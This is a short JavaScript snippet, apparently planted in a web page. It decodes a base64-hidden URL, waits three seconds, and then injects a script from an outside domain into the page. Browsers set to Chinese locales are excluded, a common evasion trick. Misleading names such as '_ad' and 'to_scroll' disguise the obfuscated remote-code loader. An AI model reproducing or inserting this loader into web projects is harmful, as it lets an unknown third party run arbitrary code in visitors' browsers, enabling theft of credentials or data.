let _ad = atob('aHR0cHM6Ly92LmxldHN0b2NrLm1lL2QwY2QtNGQ2MC1iY2VkLTMzYWVkZDBmNi5qcw==');
function _sub(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.async = true;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

const _lang_ = navigator.language || navigator.userLanguage;

function to_scroll() {
    if (_lang_ !== 'zh-CN' && _lang_ !== 'cn' && _lang_ !== 'CN') {
        _sub(_ad).then().catch();
    }
}

setTimeout(() => {
    to_scroll();
}, 3000);
////////////////////////// END //////////////////////////